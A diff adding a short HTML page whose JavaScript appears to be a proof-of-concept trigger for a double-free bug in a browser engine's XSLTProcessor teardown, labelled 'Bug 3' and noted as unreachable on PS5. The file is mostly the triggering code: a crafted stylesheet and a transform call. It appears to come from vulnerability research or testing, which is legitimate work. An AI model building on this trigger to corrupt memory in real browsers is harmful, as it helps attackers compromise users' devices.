@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html><body><script>
+// Bug 3 - double-free in XSLTProcessor teardown. NOT reachable on PS5 (ENABLE_XSLT OFF).
+const xsl =
+  '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">' +
+  '<xsl:template match="/"><r><xsl:for-each select="//*">' +
+  '<e><xsl:attribute name="a" xml:space="preserve">' + " ".repeat(64) + '</xsl:attribute></e>' +
+  '</xsl:for-each></r></xsl:template></xsl:stylesheet>';
+const p = new DOMParser();
+const proc = new XSLTProcessor();
+proc.importStylesheet(p.parseFromString(xsl, "text/xml"));
+proc.transformToDocument(p.parseFromString("<r><a></a><b></b></r>", "text/xml"));
+</script></body></html>
